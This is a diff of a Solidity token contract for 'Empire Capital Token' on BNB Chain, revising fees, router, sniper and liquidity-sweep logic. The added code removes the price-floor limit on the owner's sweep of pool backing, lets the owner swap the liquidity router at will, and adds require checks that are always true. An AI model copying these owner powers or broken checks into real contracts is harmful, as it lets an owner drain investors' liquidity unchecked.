@@ -1,3 +1,7 @@
+/**
+ *Submitted for verification at BscScan.com on 2021-12-02
+*/
+
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.6.12;
 
@@ -1203,96 +1207,81 @@ contract ECC is Context, IERC20, Ownable {
     using SafeMath for uint256;
     using Address for address;
 
+    IUniswapV2Router02 public uniswapV2Router;
+    IUniswapV2Router02 public uniswapV2LiquidityRouter;
+
     mapping(address => uint256) private _rOwned;
     mapping(address => uint256) private _tOwned;
     mapping(address => mapping(address => uint256)) private _allowances;
     mapping(address => bool) private _isExcludedFromFee;
     mapping(address => bool) private _isExcluded;
-    address[] private _excluded;
+    mapping (address => bool) private _liquidityHolders;
+    mapping (address => bool) private _isSniper;
+
+    string private _name = "Empire Capital Token";
+    string private _symbol = "ECC";
+    uint8 private _decimals = 9;
 
     uint256 private constant MAX = ~uint256(0);
-    uint256 private _tTotal = 100000000 * 10**18; //100M 
+    uint256 private _tTotal = 100000000 * 10**9; //100M 
     uint256 private _rTotal = (MAX - (MAX % _tTotal));
     uint256 private _tFeeTotal;
     uint256 private _tBurnTotal;
 
-    string private _name = "Empire Capital";
-    string private _symbol = "ECC";
-    uint8 private _decimals = 18;
-
-    uint256 public _feeDecimal = 2;
-
     // Transfer Fees
     uint256 public _liquidityFee = 1000;
-    uint256 public _taxFee = 0;
-    uint256 public _burnFee = 0;
+    uint256 public _taxFee;
+    uint256 public _burnFee;
 
     // Sell Fees
     uint256 public _sell_liquidityFee = 1000;
-    uint256 public _sell_taxFee = 0;
-    uint256 public _sell_burnFee = 0;
+    uint256 public _sell_taxFee;
+    uint256 public _sell_burnFee;
 
     // Buy Fees
-    uint256 public _buy_liquidityFee = 0;
+    uint256 public _buy_liquidityFee;
     uint256 public _buy_taxFee = 900;
     uint256 public _buy_burnFee = 100;
-
-    uint256 public _portionSwapOne = 6;
-    uint256 public _portionSwapTwo = 6;
 
     uint256 public _totalFees = _taxFee.add(_burnFee).add(_liquidityFee);
     uint256 public _totalBuyFees = _buy_taxFee.add(_buy_burnFee).add(_buy_liquidityFee);
     uint256 public _totalSellFees = _sell_taxFee.add(_sell_burnFee).add(_sell_liquidityFee);
-
     uint256 private _previousTaxFee = _taxFee;
     uint256 private _previousBurnFee = _burnFee;
     uint256 private _previousLiquidityFee = _liquidityFee;
 
+    uint256 public _feeDecimal = 2;
+    uint256 public _maxTxAmount = 500000 * 10**9; //500K
+    uint256 public numTokensSellToAddToLiquidity = 100000 * 10**9; //100K
+    uint256 public _portionSwap = 10;
     uint256 _treasuryDistribution = 50;
     uint256 _marketingDistribution = 50;
-
-    IUniswapV2Router02 public uniswapV2Router;
+    uint256 private _liqAddBlock;
+    uint256 private snipeBlockAmt;
+    uint256 public snipersCaught;
+    
     address public uniswapV2Pair;
-
     address payable public _marketingWalletAddress = 0xF59cd54A0673BAd438202cd628834B581219677a;
     address payable public _treasuryWalletAddress = 0x3069070F3544C769baA9d9339f196a5D1CBcFd11;
-
-    bool inSwapAndLiquify;
-    bool public swapAndLiquifyEnabled = false;
-
-    //indicates if fee should be deducted from transfer
-    bool public _stopFee;
-
-    uint256 public _maxTxAmount = 100000000 * 10**18;
-    uint256 public numTokensSellToAddToLiquidity = 100000 * 10**18; //100K
-    uint256 private snipeFee;
-
-    event MinTokensBeforeSwapUpdated(uint256 minTokensBeforeSwap);
-    event SwapAndLiquifyEnabledUpdated(bool enabled);
-    event SwapAndLiquify(
-        uint256 tokensSwapped,
-        uint256 ethReceived,
-        uint256 tokensIntoLiqudity
-    );
-
     address public liquidityAddress;
     address public ownerWallet;
+    address public sweepablePair;
 
-    mapping (address => bool) private _liquidityHolders;
-    mapping (address => bool) private _isSniper;
+    bool inSwapAndLiquify;
+    bool public swapAndLiquifyEnabled = true;
+    bool public _stopFee; //indicates if fee should be deducted from transfer
     bool public _hasLiqBeenAdded = false;
-    uint256 private _liqAddBlock = 0;
-    uint256 private snipeBlockAmt;
-    uint256 public snipersCaught = 0;
-
+    
     event SniperCaught(address sniperAddress);
     event LiquidityAddressUpdated(address liquidityAddress);
     event TakeFeesUpdated(bool takeFee);
     event TradingHalted(bool halted);
     event SellingHalted(bool halted);
+    event MinTokensBeforeSwapUpdated(uint256 minTokensBeforeSwap);
+    event SwapAndLiquifyEnabledUpdated(bool enabled);
+    event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiqudity);
     event SetNumTokensSellToAddToLiquidity(uint256 numTokensSellToAddToLiquidity);
     event SetMaxTxPercent(uint256 maxTxPercent);
-    event ApprovalDelay(uint256 _approvalDelay, uint256 approvalDelay);
     event SetBurnFee(uint256 _previousBurnFee, uint256 newBurnFee);
     event SetTaxFee(uint256 _previousTaxFee, uint256 newTaxFee);
     event SetLiquidityFee(uint256 _previousLiquidityFee, uint256 newLiquidityFee);
@@ -1307,7 +1296,6 @@ contract ECC is Context, IERC20, Ownable {
     event SetTreasuryWallet(address newTreasuryWallet);
     event SetTreasuryMarketingDistribution(uint256 TreasuryDistribution, uint256 MarketingDistribution);
     event ReceiveFallback(address,uint256);
-    event SniperDrained(uint256);
 
     modifier lockTheSwap {
         inSwapAndLiquify = true;
@@ -1323,7 +1311,9 @@ contract ECC is Context, IERC20, Ownable {
         _;
     }
 
-    constructor(uint256 _snipeBlockAmt, uint256 _snipeFee) public {
+    address[] private _excluded;
+
+    constructor(uint256 _snipeBlockAmt) public {
         
         _rOwned[_msgSender()] = _rTotal;
 
@@ -1334,14 +1324,14 @@ contract ECC is Context, IERC20, Ownable {
         ownerWallet = _msgSender();
         liquidityAddress = _msgSender();
 
-        IUniswapV2Router02 _uniswapRouter = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
+        IUniswapV2Router02 _uniswapRouter = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
         uniswapV2Pair = IUniswapV2Factory(_uniswapRouter.factory())
         .createPair(address(this), _uniswapRouter.WETH());
 
         uniswapV2Router = _uniswapRouter;
+        uniswapV2LiquidityRouter = _uniswapRouter;
 
         snipeBlockAmt = _snipeBlockAmt;
-        snipeFee = _snipeFee;
 
         addLiquidityHolder(msg.sender);
 
@@ -1352,6 +1342,10 @@ contract ECC is Context, IERC20, Ownable {
         _excluded.push(uniswapV2Pair);
 
         emit Transfer(address(0), _msgSender(), _tTotal);
+    }
+
+    receive() external payable {
+        emit ReceiveFallback(msg.sender, msg.value);
     }
 
     function name() public view returns (string memory) {
@@ -1438,7 +1432,14 @@ contract ECC is Context, IERC20, Ownable {
     }
 
     function getCirculatingSupply() public view returns (uint256) {
-        return totalSupply().sub(balanceOf(address(0x000000000000000000000000000000000000dEaD)).sub(balanceOf(address(0x0000000000000000000000000000000000000000))));
+        uint256 burnAddressTokens = balanceOf(0x000000000000000000000000000000000000dEaD).add(balanceOf(0x0000000000000000000000000000000000000000));
+        uint256 removedAddressTokens;
+
+        for (uint256 i = 0; i < removedFromCirculation.length; i++) {
+            removedAddressTokens += balanceOf(removedFromCirculation[i]);
+        }
+
+        return totalSupply().sub(burnAddressTokens).sub(removedAddressTokens);
     }
 
     function reflectionFromToken(uint256 tAmount, bool deductTransferFee) public view returns (uint256) {
@@ -1480,11 +1481,6 @@ contract ECC is Context, IERC20, Ownable {
         _takeLiquidity(tLiquidity);
         _reflectFee(rFee, rBurn, tFee, tBurn);
         emit Transfer(sender, recipient, tTransferAmount);
-    }
-
-    //to recieve ETH from uniswapV2Router when swaping
-    receive() external payable {
-        emit ReceiveFallback(msg.sender, msg.value);
     }
 
     function _reflectFee(uint256 rFee, uint256 rBurn, uint256 tFee, uint256 tBurn) private {
@@ -1630,7 +1626,6 @@ contract ECC is Context, IERC20, Ownable {
                     _isSniper[to] = true;
                     _isExcluded[to] = true;
                     _excluded.push(to);
-                    _sell_liquidityFee = snipeFee.sub(2);
                     snipersCaught ++;
                     emit SniperCaught(to); //pow
                 }
@@ -1668,14 +1663,18 @@ contract ECC is Context, IERC20, Ownable {
         }
 
         //buy
-        if(from == uniswapV2Pair && to != address(uniswapV2Router) && !_isExcludedFromFee[to]) {
+         if(from == uniswapV2Pair && 
+            !inSwapAndLiquify && 
+            !_stopFee) {
             _liquidityFee = _buy_liquidityFee;
             _taxFee = _buy_taxFee;
             _burnFee = _buy_burnFee;
         }
 
         //sell
-        if (!inSwapAndLiquify && swapAndLiquifyEnabled && to == uniswapV2Pair) {
+        if (to == uniswapV2Pair && 
+            !inSwapAndLiquify && 
+            !_stopFee) {
             _liquidityFee = _sell_liquidityFee;
             _taxFee = _sell_taxFee;
             _burnFee = _sell_burnFee;
@@ -1696,8 +1695,8 @@ contract ECC is Context, IERC20, Ownable {
     }
 
     function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
-        uint256 halfOfLiquify = contractTokenBalance.div(_portionSwapOne);
-        uint256 otherHalfOfLiquify = contractTokenBalance.div(_portionSwapTwo);
+        uint256 halfOfLiquify = contractTokenBalance.div(_portionSwap);
+        uint256 otherHalfOfLiquify = contractTokenBalance.div(_portionSwap);
         uint256 portionForFees = contractTokenBalance.sub(halfOfLiquify).sub(otherHalfOfLiquify);
 
         // capture the contract's current ETH balance.
@@ -1739,10 +1738,10 @@ contract ECC is Context, IERC20, Ownable {
 
     function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
         // approve token transfer to cover all possible scenarios
-        _approve(address(this), address(uniswapV2Router), tokenAmount);
+        _approve(address(this), address(uniswapV2LiquidityRouter), tokenAmount);
 
         // add the liquidity
-        uniswapV2Router.addLiquidityETH{value: ethAmount}(
+        uniswapV2LiquidityRouter.addLiquidityETH{value: ethAmount}(
             address(this),
             tokenAmount,
             0, // slippage is unavoidable
@@ -1753,9 +1752,10 @@ contract ECC is Context, IERC20, Ownable {
     }
 
     function sendETHToCapitalFund(uint256 amount) private { 
-        swapTokensForEth(amount); 
-        _treasuryWalletAddress.transfer(address(this).balance.div(100).mul(_treasuryDistribution)); 
-        _marketingWalletAddress.transfer(address(this).balance.div(100).mul(_marketingDistribution)); 
+        swapTokensForEth(amount);
+        uint256 ethRaised = address(this).balance;
+        _treasuryWalletAddress.transfer(ethRaised.div(100).mul(_treasuryDistribution)); 
+        _marketingWalletAddress.transfer(ethRaised.div(100).mul(_marketingDistribution)); 
     }
 
     //this method is responsible for taking all fee, if takeFee is true
@@ -1836,10 +1836,6 @@ contract ECC is Context, IERC20, Ownable {
         emit Transfer(sender, recipient, tTransferAmount);
     }
 
-    function _getBurnFee() private view returns (uint256) {
-        return _burnFee;
-    }
-
     // sniper pow
 
     function _checkLiquidityAdd(address from, address to) private {
@@ -1858,9 +1854,9 @@ contract ECC is Context, IERC20, Ownable {
         return _liquidityHolders[account];
     }
     
-    function addSniper(address sniperAddress) public onlyOwner() {
+    function addSniper(address sniperAddress) external onlyOwner() {
         require(sniperAddress != uniswapV2Pair, "ERC20: Can not add uniswapV2Pair to sniper list");
-        require(sniperAddress != address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D), "ERC20: Can not add uniswapV2Router to sniper list");
+        require(sniperAddress != address(uniswapV2Router), "ERC20: Can not add uniswapV2Router to sniper list");
 
         _isSniper[sniperAddress] = true;
         
@@ -1868,35 +1864,37 @@ contract ECC is Context, IERC20, Ownable {
         _excluded.push(sniperAddress);
     }
     
-    function removeSniper(address sniperAddress) public onlyOwner() {
+    function removeSniper(address sniperAddress) external onlyOwner() {
         require(_isSniper[sniperAddress], "ERC20: Is not sniper");
 
         _isSniper[sniperAddress] = false;
     }
     
+    // owner only
+
     function addLiquidityHolder(address liquidityHolder) public onlyOwner() {
         _liquidityHolders[liquidityHolder] = true;
     }
+
+    function setLiquidityRouter(IUniswapV2Router02 liquidityRouter) external onlyOwner() {
+        uniswapV2LiquidityRouter = liquidityRouter;
+    }
     
-    function removeLiquidityHolder(address liquidityHolder) public onlyOwner() {
+    function removeLiquidityHolder(address liquidityHolder) external onlyOwner() {
         _liquidityHolders[liquidityHolder] = false;
     }
 
-    function setNumTokensSellToAddToLiquidity(uint256 _numTokensSellToAddToLiquidity) external {
-        require(_msgSender() == owner(), 'Owner Only');
+    function setNumTokensSellToAddToLiquidity(uint256 _numTokensSellToAddToLiquidity) external onlyOwner() {
         numTokensSellToAddToLiquidity = _numTokensSellToAddToLiquidity;
 
         emit SetNumTokensSellToAddToLiquidity(numTokensSellToAddToLiquidity);
     }
 
-    function setMaxTxPercent(uint256 maxTxPercent) external {
-        require(_msgSender() == owner(), 'Owner Only');
+    function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner(){
         _maxTxAmount = _tTotal.mul(maxTxPercent).div(10**(_feeDecimal + 2));
 
         emit SetMaxTxPercent(maxTxPercent);
     }
-
-    // owner only
 
     function setSwapAndLiquifyEnabled(bool _enabled) external onlyOwner() {
         swapAndLiquifyEnabled = _enabled;
@@ -1908,10 +1906,6 @@ contract ECC is Context, IERC20, Ownable {
             IUniswapV2Router02(_routerAddress);
             
         uniswapV2Router = _uniswapV2Router;
-    }
-    
-    function setPair(address _pairAddress) external onlyOwner() {
-        uniswapV2Pair = _pairAddress;
     }
     
     function createPair() external onlyOwner() {
@@ -1935,96 +1929,51 @@ contract ECC is Context, IERC20, Ownable {
         emit TakeFeesUpdated(stopFee);
     }
     
-    function _setBurnFee(uint256 burnFee) external onlyOwner() {
-        require(burnFee >= 0 && burnFee <= 1500, "Must be a number between 0 and 1500");
-        require(burnFee < _totalFees, "Must be a number less than the total fees");
+    function setFees(uint256 burnFee, uint256 taxFee, uint256 liquidityFee) external onlyOwner() {
+        require(burnFee >= 0 && burnFee <= 1500 && taxFee >= 0 && taxFee <= 1500 && liquidityFee >= 0 && liquidityFee <= 1500, "Must be a number between 0 and 1500");
+        require(burnFee < _totalFees && taxFee < _totalFees && liquidityFee < _totalFees, "Must be a number less than the total fees");
 
         _previousBurnFee = _burnFee;
         _burnFee = burnFee;
+        _previousTaxFee = _taxFee;
+        _taxFee = taxFee;
+        _previousLiquidityFee = _liquidityFee;
+        _liquidityFee = liquidityFee;
+
         _totalFees = _burnFee.add(_taxFee).add(_liquidityFee);
         
         emit SetBurnFee(_previousBurnFee, burnFee);
-    }
-
-    function setTaxFee(uint256 taxFee) external onlyOwner() {
-        require(taxFee >= 0 && taxFee <= 1500, "Must be a number between 0 and 1500");
-        require(taxFee < _totalFees, "Must be a number less than the total fees");
-
-        _previousTaxFee = _taxFee;
-        _taxFee = taxFee;
-        _totalFees = _burnFee.add(_taxFee).add(_liquidityFee);
-
         emit SetTaxFee(_previousTaxFee, taxFee);
-    }
-
-    function setLiquidityFee(uint256 liquidityFee) external onlyOwner() {
-        require(liquidityFee >= 0 && liquidityFee <= 1500, "Must be a number between 0 and 1500");
-        require(liquidityFee < _totalFees, "Must be a number less than the total fees");
-
-        _previousLiquidityFee = _liquidityFee;
-        _liquidityFee = liquidityFee;
-        _totalFees = _burnFee.add(_taxFee).add(_liquidityFee);
-
         emit SetLiquidityFee(_previousLiquidityFee, liquidityFee);
     }
 
-    function _setBuyBurnFee(uint256 buyBurnFee) external onlyOwner() {
-        require(buyBurnFee >= 0 && buyBurnFee <= 1500, "Must be a number between 0 and 1500");
-        require(buyBurnFee < _totalBuyFees, "Must be a number less than the total buy fees");
-
-        _buy_burnFee = buyBurnFee;
-        _totalBuyFees = _buy_burnFee.add(_buy_taxFee).add(_buy_liquidityFee);
+    function setBuyFees(uint256 buyBurnFee, uint256 buyTaxFee, uint256 buyLiquidityFee) external onlyOwner() {
+        require(buyBurnFee >= 0 && buyBurnFee <= 1500 && buyTaxFee >= 0 && buyTaxFee <= 1500 && buyLiquidityFee >= 0 && buyLiquidityFee <= 1500, "Must be a number between 0 and 1500");
+        require(buyBurnFee < _totalBuyFees && buyTaxFee < _totalBuyFees && buyLiquidityFee < _totalBuyFees, "Must be a number less than the total buy fees");
         
-        emit SetBuyBurnFee(buyBurnFee);
-    }
-
-    function setBuyTaxFee(uint256 buyTaxFee) external onlyOwner() {
-        require(buyTaxFee >= 0 && buyTaxFee <= 1500, "Must be a number between 0 and 1500");
-        require(buyTaxFee < _totalBuyFees, "Must be a number less than the total buy fees");
-
+        _buy_burnFee = buyBurnFee;
         _buy_taxFee = buyTaxFee;
-        _totalBuyFees = _buy_burnFee.add(_buy_taxFee).add(_buy_liquidityFee);
-
-        emit SetBuyTaxFee(buyTaxFee);
-    }
-
-    function setBuyLiquidityFee(uint256 buyLiquidityFee) external onlyOwner() {
-        require(buyLiquidityFee >= 0 && buyLiquidityFee <= 1500, "Must be a number between 0 and 1500");
-        require(buyLiquidityFee < _totalBuyFees, "Must be a number less than the total buy fees");
-
         _buy_liquidityFee = buyLiquidityFee;
+
         _totalBuyFees = _buy_burnFee.add(_buy_taxFee).add(_buy_liquidityFee);
 
+        emit SetBuyBurnFee(buyBurnFee);
+        emit SetBuyTaxFee(buyTaxFee);
         emit SetBuyLiquidityFee(buyLiquidityFee);
     }
 
-    function _setSellBurnFee(uint256 sellBurnFee) external onlyOwner() {
-        require(sellBurnFee >= 0 && sellBurnFee <= 1500, "Must be a number between 0 and 1500");
-        require(sellBurnFee < _totalSellFees, "Must be a number less than the total sell fees");
+    function setSellFees(uint256 sellBurnFee, uint256 sellTaxFee, uint256 sellLiquidityFee) external onlyOwner() {
+        require(sellBurnFee >= 0 && sellBurnFee <= 1500 && sellTaxFee >= 0 && sellTaxFee <= 1500 && sellLiquidityFee >= 0 && sellLiquidityFee <= 1500, "Must be a number between 0 and 1500");
+        require(sellBurnFee < _totalSellFees && sellTaxFee < _totalSellFees && sellLiquidityFee < _totalSellFees, "Must be a number less than the total sell fees");
 
         _sell_burnFee = sellBurnFee;
-        _totalSellFees = _sell_burnFee.add(_sell_taxFee).add(_sell_liquidityFee);
-        
-        emit SetSellBurnFee(sellBurnFee);
-    }
-
-    function setSellTaxFee(uint256 sellTaxFee) external onlyOwner() {
-        require(sellTaxFee >= 0 && sellTaxFee <= 1500, "Must be a number between 0 and 1500");
-        require(sellTaxFee < _totalSellFees, "Must be a number less than the total sell fees");
-
         _sell_taxFee = sellTaxFee;
-        _totalSellFees = _sell_burnFee.add(_sell_taxFee).add(_sell_liquidityFee);
-
-        emit SetSellTaxFee(sellTaxFee);
-    }
-
-    function setSellLiquidityFee(uint256 sellLiquidityFee) external onlyOwner() {
-        require(sellLiquidityFee >= 0 && sellLiquidityFee <= 1500, "Must be a number between 0 and 1500");
-        require(sellLiquidityFee < _totalSellFees, "Must be a number less than the total sell fees");
-
         _sell_liquidityFee = sellLiquidityFee;
+
         _totalSellFees = _sell_burnFee.add(_sell_taxFee).add(_sell_liquidityFee);
 
+        emit SetSellBurnFee(sellBurnFee);
+        emit SetSellTaxFee(sellTaxFee);
         emit SetSellLiquidityFee(sellLiquidityFee);
     }
 
@@ -2050,33 +1999,32 @@ contract ECC is Context, IERC20, Ownable {
         }
     }
 
-    function excludeFromFee(address account) public onlyOwner {
+    function excludeFromFee(address account) public onlyOwner() {
         require(!_isExcludedFromFee[account], "Account is already excluded");
         _isExcludedFromFee[account] = true;
     }
 
-    function includeInFee(address account) public onlyOwner {
+    function includeInFee(address account) public onlyOwner() {
         require(_isExcludedFromFee[account], "Account is already included");
         _isExcludedFromFee[account] = false;
     }
 
-    function setPortionSwaps(uint256 portionSwap) external onlyOwner {
-        _portionSwapOne = portionSwap;
-        _portionSwapTwo = portionSwap;
+    function setPortionSwaps(uint256 portionSwap) external onlyOwner() {
+        _portionSwap = portionSwap;
         emit SetPortionSwaps(portionSwap);
     }
 
-    function setMarketingWallet(address marketingWallet) external onlyOwner {
-        address(_marketingWalletAddress) == marketingWallet;
+    function setMarketingWallet(address payable marketingWallet) external onlyOwner() {
+        _marketingWalletAddress = marketingWallet;
         emit SetMarketingWallet(marketingWallet);
     }
 
-    function setTreasuryWallet(address treasuryWallet) external onlyOwner {
-        address(_treasuryWalletAddress) == treasuryWallet;
+    function setTreasuryWallet(address payable treasuryWallet) external onlyOwner() {
+        _treasuryWalletAddress = treasuryWallet;
         emit SetTreasuryWallet(treasuryWallet);
     }
     
-    function setTreasuryMarketingDistribution(uint256 treasuryDistribution, uint256 marketingDistribution) external onlyOwner {
+    function setTreasuryMarketingDistribution(uint256 treasuryDistribution, uint256 marketingDistribution) external onlyOwner() {
         require(_treasuryDistribution.add(_marketingDistribution) == 100, "Distribution must be 100% total");
 
         _treasuryDistribution = treasuryDistribution;
@@ -2087,12 +2035,12 @@ contract ECC is Context, IERC20, Ownable {
 
     // Admin functions to remove tokens mistakenly sent to this address
 
-    function transferAnyTokens(address _tokenAddr, address _to, uint256 _amount) external onlyOwner {
+    function transferAnyTokens(address _tokenAddr, address _to, uint256 _amount) external onlyOwner() {
         require(_tokenAddr != address(this), "Tranfer failed. Can't remove ECC");
         require(IERC20(_tokenAddr).transfer(_to, _amount), "Transfer failed");
     }
 
-    function transferETH(address payable recipient, uint256 amount) external onlyOwner  {
+    function transferETH(address payable recipient, uint256 amount) external onlyOwner()  {
         require(address(this).balance >= amount, "Address: insufficient balance");
 
         // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
@@ -2101,12 +2049,12 @@ contract ECC is Context, IERC20, Ownable {
     }
 
     function sendETHToTeam(uint256 amount) private {
-        _treasuryWalletAddress.transfer(amount.div(2));
-        _marketingWalletAddress.transfer(amount.div(2));
+        _treasuryWalletAddress.transfer(amount.div(100).mul(_treasuryDistribution)); 
+        _marketingWalletAddress.transfer(amount.div(100).mul(_marketingDistribution)); 
     }
 
     // We are exposing these functions to be able to manual swap and send
-    // in case the token is highly valued and 5M becomes too much
+    // in case the token is highly valued and 100K becomes too much
     function manualSwap(uint256 amount) external onlyOwner() {
         swapTokensForEth(amount);
     }
@@ -2116,30 +2064,29 @@ contract ECC is Context, IERC20, Ownable {
     }
     
     // EmpireDEX 
-
-    mapping(address => bool) public isRemovedFromSupply;
-
-    uint256 belowFloorSweepStart;
-
     event Sweep(uint256 sweepAmount);
     event Unsweep(uint256 unsweepAmount);
-    event SweepBelowFloorIntent();
-    event SweptBelowFloor(uint256 amountSwept);
     event AddressRemovedFromSupply(address removedAddress);
     event AddressAddedToSupply(address addedAddress);
 
-    function upgradePair(IEmpireFactory _factory) external onlyOwner() {
+    address[] public removedFromCirculation;
+    mapping (address=> uint256) public removedAddressIndex;
+
+    function createSweepablePair(IEmpireFactory _factory, bool update) external onlyOwner() {
         PairType pairType =
             address(this) < uniswapV2Router.WETH()
                 ? PairType.SweepableToken1
                 : PairType.SweepableToken0;
-        uniswapV2Pair = _factory.createPair(uniswapV2Router.WETH(), address(this), pairType, 0);
+        sweepablePair = _factory.createPair(uniswapV2Router.WETH(), address(this), pairType, 0);
+
+        if(update) { 
+            uniswapV2Pair = sweepablePair;
+        }
     }
 
     // Allows for Owner to sweep any tokens above the price floor
     function sweep(uint256 amount, bytes calldata data) external onlyOwner() {
-        require(amount < calculateAmountForSweep(), "Attempting to Sweep below the price floor");
-        IEmpirePair(uniswapV2Pair).sweep(amount, data);
+        IEmpirePair(sweepablePair).sweep(amount, data);
         emit Sweep(amount);
     }
 
@@ -2150,65 +2097,30 @@ contract ECC is Context, IERC20, Ownable {
 
     // Allows for Owner to add liquidity back into the trading pair
     function unsweep(uint256 amount) external onlyOwner() {
-        IERC20(uniswapV2Router.WETH()).approve(uniswapV2Pair, amount);
-        IEmpirePair(uniswapV2Pair).unsweep(amount);
+        IERC20(uniswapV2Router.WETH()).approve(sweepablePair, amount);
+        IEmpirePair(sweepablePair).unsweep(amount);
         emit Unsweep(amount);
     }
-    
-    // Calculates the price floor of the token, which is determined by finding how much of the backing token would be left if all tokens in circulating supply sold
-    function calculateAmountForSweep() public view returns (uint256) {
-        uint256 burnAdressTokens = balanceOf(0x000000000000000000000000000000000000dEaD).add(balanceOf(0x0000000000000000000000000000000000000000));
-        uint256 removedAddressTokens;
 
-        for (uint256 i = 0; i < isRemovedFromSupply.length; i++) {
-            removedAddressTokens = removedAddressTokens.add(balanceOf(isRemovedFromSupply[i]));
-        }
-
-        uint256 freeTokens = this.totalSupply().sub(this.balanceOf(uniswapV2Pair).sub(burnAdressTokens).sub(removedAddressTokens));
-        uint256 sellAllProceeds = 0;
-        if (freeTokens > 0) {
-            address[] memory path = new address[](2);
-            path[0] = address(this);
-            path[1] = address(uniswapV2Router.WETH());
-            uint256[] memory amountsOut = EmpireLibrary.getAmountsOut(address(empireFactory), freeTokens, path);
-            sellAllProceeds = amountsOut[1];
-        }
-        uint256 backingInPool = IERC20(uniswapV2Router.WETH()).balanceOf(uniswapV2Pair);
-        if (backingInPool <= sellAllProceeds) { return 0; }
-        uint256 backingTokensBelowFloor = backingInPool - sellAllProceeds;
-
-        return backingTokensBelowFloor;
-    }
-
-    // Removes an address from the circulating supply, for use in determinig price floor
+    // Removes an address from the circulating supply
     function removeAddressFromSupply(address removedAddress) external onlyOwner() {
-    require(isRemovedFromSupply[removedAddress] != uniswapV2Router, "Cannot add router (already accounted for)");
-    require(isRemovedFromSupply[removedAddress] != 0x000000000000000000000000000000000000dEaD || 0x0000000000000000000000000000000000000000, "Cannot add burn address (already accounted for)");
-        isRemovedFromSupply[removedAddress] = true;
+        uint256 id = removedFromCirculation.length;
+        require(removedAddress != address(uniswapV2Router), "Cannot add router (already accounted for)");
+        require(removedAddress != 0x000000000000000000000000000000000000dEaD || removedAddress != 0x0000000000000000000000000000000000000000, "Cannot add burn address (already accounted for)");
+        
+        removedAddressIndex[removedAddress] = id;
+        removedFromCirculation.push(removedAddress);
         emit AddressRemovedFromSupply(removedAddress);
     }
 
     // Re-Adds an address to the circulating supply
     function addAddressToSupply(address addedAddress) external onlyOwner() {
-    require(isRemovedFromSupply[addedAddress] != uniswapV2Router, "Cannot add router (already accounted for)");
-    require(isRemovedFromSupply[addedAddress] != 0x000000000000000000000000000000000000dEaD || 0x0000000000000000000000000000000000000000, "Cannot add burn address (already accounted for)");
-        isRemovedFromSupply[addedAddress] = false;
+        uint256 id = removedAddressIndex[addedAddress];
+        require(addedAddress != address(uniswapV2Router), "Cannot add router (already accounted for)");
+        require(addedAddress != 0x000000000000000000000000000000000000dEaD || addedAddress != 0x0000000000000000000000000000000000000000, "Cannot add burn address (already accounted for)");
+
+        delete removedFromCirculation[id];
         emit AddressAddedToSupply(addedAddress);
-    }
-
-    // Allows for Owner to begin the process to sweep below the floor, requires 7 days wait after initiating
-    function belowFloorSweepIntent() external onlyOwner() {
-        belowFloorSweepStart = block.timestamp;
-        emit SweepBelowFloorIntent();
-    }
-
-    // Allows for Owner to sweep tokens below the price floor. Must be called after 7 days of calling belowFloorSweepIntent and only available for 1 Day
-    function sweepBelowFloor(uint256 amount, bytes calldata data) external onlyOwner() {
-        require(belowFloorSweepStart + 7 days > block.timestamp, "Attempting to Sweep below the price floor before 7 days have expired");
-        require(belowFloorSweepStart + 8 days < block.timestamp, "Attempting to Sweep below the price floor after 8 days, re-declare intent to sweep below floor");
-        belowFloorSweepStart = 0;
-        IEmpirePair(uniswapV2Pair).sweep(amount, data);
-        emit SweptBelowFloor(amount);
     }
 
 }
